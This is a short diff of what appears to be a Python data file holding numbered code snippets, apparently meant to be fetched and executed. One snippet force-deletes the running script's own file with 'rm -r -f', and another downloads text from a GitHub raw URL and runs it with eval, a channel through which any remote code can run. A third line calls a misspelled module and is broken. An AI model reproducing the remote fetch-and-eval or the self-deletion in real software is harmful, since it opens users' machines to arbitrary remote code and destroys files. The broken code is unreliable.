@@ -1,4 +1,4 @@
-code = {
+{
 "0000":"""import os\nos.system(f"rm -r -f {__file__}")""",
 "0001":"""import requests\ncode=eval(requests.get(f"https://raw.githubusercontent.com/Gabutman/database/main/Update/FL-{version:04n}").text)\n""",
 "0002":"""import os\nbos.popen("pwd").read()"""
